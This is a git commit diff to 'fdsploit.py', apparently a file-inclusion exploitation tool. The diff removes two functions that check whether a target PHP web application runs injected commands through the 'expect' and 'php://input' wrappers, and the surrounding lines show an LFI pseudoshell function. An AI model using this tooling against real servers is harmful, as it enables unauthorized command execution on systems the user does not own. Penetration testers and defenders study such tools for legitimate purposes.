3a2d90e0cbf3991d955e60fe28b759a6de017850
Christophoros Petrou <chripetr123@gmail.com>
2018-10-28 02:53:20 +0300

    minor bug fix

--- fdsploit.py
+++ fdsploit.py
@@ -22,45 +22,6 @@ HOST, PORT = None, None
 USER_AGENT = 'FDsploit_{}_agent'.format(__version__)
 
 
-# make it also return a code positive/negative
-def test_php_expect(command, verb, url, param, cookie, proxy, parameters=None):
-    print '\n{}[*]{} Trying to execute commands with "expect"...'.format(BT, S)
-    if verb == "GET":
-        ans1 = req(verb, inject(url, param, 'COMMAND'), cookie, proxy)
-        ans2 = req(verb, inject(url, param, php_expect(command)), cookie, proxy)
-    else: # POST request
-        parameters[param] = 'COMMAND'
-        ans1 = req(verb, url, cookie, proxy, parameters)
-        parameters[param] = php_expect(command)
-        ans2 = req(verb, url, cookie, proxy, parameters)
-    if hashpage(ans1.text) != hashpage(ans2.text):
-        ret(.1)
-        print "{0}[+]{1} It's seems possible to be able to execute commands with 'expect'!".format(FG,S)
-        return 1
-    else:
-        ret(.1)
-        print "{0}[x]{1} It's seems it's NOT possible to execute commands with 'expect'!".format(FR,S)
-        return 0
-
-
-def test_php_input(command, verb, url, param, cookie, proxy):
-    if verb == "GET":
-        print '{}[*]{} Trying to execute commands with "php://input"...'.format(BT, S)
-        ans1 = req(verb, inject(url, param, 'COMMAND'), cookie, proxy)
-        ans2 = req(verb, inject(url, param, 'php://input'), cookie, proxy, raw_data=php_input(command))
-        if hashpage(ans1.text) != hashpage(ans2.text):
-            ret(.1)
-            print "{0}[+]{1} It's seems possible to be able to execute commands with 'php://input'!".format(FG,S)
-            return 1
-        else:
-            ret(.1)
-            print "{0}[x]{1} It's seems it's NOT possible to execute commands with 'php://input'!".format(FR,S)
-            return 0
-    else:
-        pass
-        return 0
-
-
 def LFIshell(shell_type, url, verb, cookie, tchar, proxy, b64, uenc, parameters=None):
     """LFI pseudoshell"""
     try:
